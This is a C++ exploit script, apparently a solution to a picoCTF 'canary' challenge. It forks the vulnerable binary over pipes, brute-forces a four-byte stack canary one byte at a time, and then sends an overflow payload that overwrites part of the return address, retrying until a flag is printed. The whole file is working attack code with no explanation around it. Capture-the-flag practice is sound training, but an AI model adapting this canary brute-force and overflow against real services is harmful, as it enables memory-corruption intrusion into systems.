#include <iostream>
#include <cstdio>
#include <algorithm>
#include <unistd.h>
#include <sys/wait.h>
#include <sys/prctl.h>
#include <signal.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <string.h>
using namespace std;
#define endl '\n'
#define pi pair<int, int>

pid_t pid;
int inpipefd[2];
int outpipefd[2];
char buf[256];
int status;

void runcmd(string s = "/problems/canary_3_257a2a2061c96a7fb8326dbbc04d0328/vuln", string arg = ""){
	pid = 0;
	pipe(inpipefd);
	pipe(outpipefd);
	pid = fork();
	if(pid == 0){
		dup2(outpipefd[0], STDIN_FILENO);
		dup2(inpipefd[1], STDOUT_FILENO);
		dup2(inpipefd[1], STDOUT_FILENO);
		
		prctl(PR_SET_PDEATHSIG, SIGTERM);
		
		execl(s.c_str(), arg.c_str(), (char*)NULL);
		
		exit(1);
	}
	
	close(outpipefd[0]);
	close(inpipefd[1]);
}

void killcmd(){
	kill(pid, SIGKILL);
	waitpid(pid, &status, 0);
}

string cmdin(){
	read(inpipefd[0], buf, 256);
	return string(buf);
}

void cmdout(string s){
	s += '\n';
	write(outpipefd[1], s.c_str(), (int)s.size());
}

void cmdout(int x){
	string s = to_string(x) + '\n';
	write(outpipefd[1], s.c_str(), (int)s.size());
}

string cmdflag(string s, string f = "pico"){
	string ret = "";
	while(ret.find(f) == string::npos){
		runcmd();
		cmdin();
		cmdout(s.size());
		cmdin();
		cmdout(s);
		read(2, buf, 256);
		ret = string(buf);
		cout << ret << endl;
		killcmd();
	}
	return ret;
}

int main(){
	ios::sync_with_stdio(false);
	cin.tie(NULL);
	
	string s = string(32, 'a'), t;
	
	for(int i = 32; i < 36; i++){
		s.resize(i + 1);
		for(int j = 0; j < 256; j++){
			s[i] = (char)j;
			runcmd();
			t = cmdin();
			cmdout(i + 1);
			t = cmdin();
			cmdout(s);
			t = cmdin();
			killcmd();
			if(t[0] == 'O'){
				cout << j << endl;
				break;
			}
		}
	}
	
	s += string(16, 'a') + "\xed\x07\x00\x00";
	
	cout << cmdflag(s) << endl;

	return 0;
}
